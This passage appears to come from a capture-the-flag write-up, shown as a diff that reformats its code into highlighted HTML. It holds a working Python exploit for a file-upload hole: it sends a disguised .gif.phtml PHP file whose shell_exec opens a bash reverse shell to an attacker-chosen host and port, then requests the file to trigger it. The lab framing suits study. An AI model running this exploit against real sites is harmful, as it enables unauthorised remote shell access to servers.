-    &quot;Referer&quot;: sys.argv[1]}
-    filename = &quot;&quot;.join([random.choice(string.ascii_lowercase) for _ in range(random.randint(5,12))])
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> 
+    <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">12</span><span class="p">))])</span>
 
-    data = f&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;{filename}.gif.phtml\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">{filename}.gif.phtml</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    cookies = {
-    &quot;isHuman&quot; : &quot;1&quot;
-    }
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span>
+    <span class="p">}</span>
 
-    r = requests.post(url, headers=headers, data=data, verify=False, cookies = cookies)
-    print(r.text)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + f&quot;/assets/data/usrimg/{filename}.gif.phtml&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify=False, cookies = cookies)
-</code></pre><blockquote>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">f</span><span class="s2">&#34;/assets/data/usrimg/{filename}.gif.phtml&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+</code></pre></div><blockquote>
 <p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
 </blockquote>
 <p>Let&rsquo;s exploit to get a reverse shell ..!</p>
